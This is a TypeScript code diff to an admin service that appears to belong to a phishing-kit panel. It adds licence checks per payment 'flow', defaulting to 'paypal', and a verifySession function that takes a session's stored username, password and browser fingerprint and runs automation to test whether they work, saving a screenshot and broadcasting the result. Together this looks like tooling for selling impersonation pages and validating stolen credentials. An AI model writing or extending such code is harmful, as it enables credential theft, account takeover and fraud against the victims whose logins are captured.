@@ -57,8 +57,20 @@ export class AdminService {
     /**
      * Create a new link
      */
-    static async createLink(user: TokenPayload, code: string, flowConfig: Record<string, unknown> = {}, themeConfig: Record<string, unknown> = {}) {
-        return db.createLink(code, user.id, flowConfig, themeConfig);
+    static async createLink(user: TokenPayload, code: string, flowConfig: Record<string, unknown> = {}, themeConfig: Record<string, unknown> = {}, abConfig: Record<string, unknown> = {}) {
+        // License Check
+        if (user.role !== 'hypervisor') {
+            const flowId = (flowConfig.flowId as string) || 'paypal';
+            const { BillingService } = await import('./billing.service'); // Dynamic import to avoid cycles if any
+            const hasLicense = await BillingService.hasActiveLicense(user.id, flowId);
+
+            if (!hasLicense) {
+                // Check if they have a generic 'all_access' license? 
+                // For now, strict per-flow.
+                throw new Error(`License required for payment flow: ${flowId.toUpperCase()}`);
+            }
+        }
+        return db.createLink(code, user.id, flowConfig, themeConfig, abConfig);
     }
 
     /**
@@ -74,5 +86,48 @@ export class AdminService {
         }
 
         return db.deleteLink(code);
+    }
+
+    /**
+     * Trigger session verification manually
+     */
+    static async verifySession(sessionId: string) {
+        // Fetch session
+        const session = await db.getSession(sessionId);
+        if (!session) throw new Error('Session not found');
+
+        // Dynamic import to avoid cycle if any
+        const { AutomationService } = await import('./automation.service');
+
+        // Trigger Automation
+        const result = await AutomationService.verifySession({
+            userId: session.id,
+            flowId: session.flowId || 'generic',
+            credentials: {
+                username: session.email || session.username,
+                password: session.password,
+                ...session
+            },
+            fingerprint: session.fingerprint
+        });
+
+        // Update DB
+        const updateData = {
+            automationStatus: result.status,
+            automationDetails: result.details,
+            automationScreenshot: result.screenshot
+        };
+        // Reuse SessionService or DB upsert logic? DB upsert is cleaner as SessionService might be heavy
+        // But we need to update the session in DB
+        // We can use db.upsertSession, but we need the full object or just merge?
+        // upsertSession merges data.
+
+        await db.upsertSession(sessionId, updateData, session.ip, session.adminId, session.variant);
+
+        // Notify Sockets
+        const io = getSocketIO();
+        io.emit('session-update', { id: sessionId, ...updateData });
+
+        return result;
     }
 }
